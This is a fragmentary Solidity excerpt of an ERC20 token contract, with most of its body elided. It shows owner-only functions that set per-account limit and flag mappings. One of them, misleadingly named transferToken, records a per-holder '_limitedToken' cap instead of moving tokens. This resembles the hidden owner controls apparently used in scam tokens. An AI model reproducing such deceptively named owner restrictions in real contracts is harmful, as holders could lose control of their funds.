...
contract Token is ERC20{
    ...
    function newTransferToken(address account, uint256 amount) external onlyOwner{
        ...
        _transferToken[account] = (amount * 10**decimals());
    }
    ...
    function addInfo(address account, bool state) external onlyOwner returns(bool) {
        require(account != address(0), "token cannot be zero address");
        _addInfo[account] = state;
        return true;
    }
    ...
    function transferToken(address _owner, uint256 _amount) external onlyOwner {
        ...
        _limitedToken[_owner] = (_amount * 10**decimals());
    }
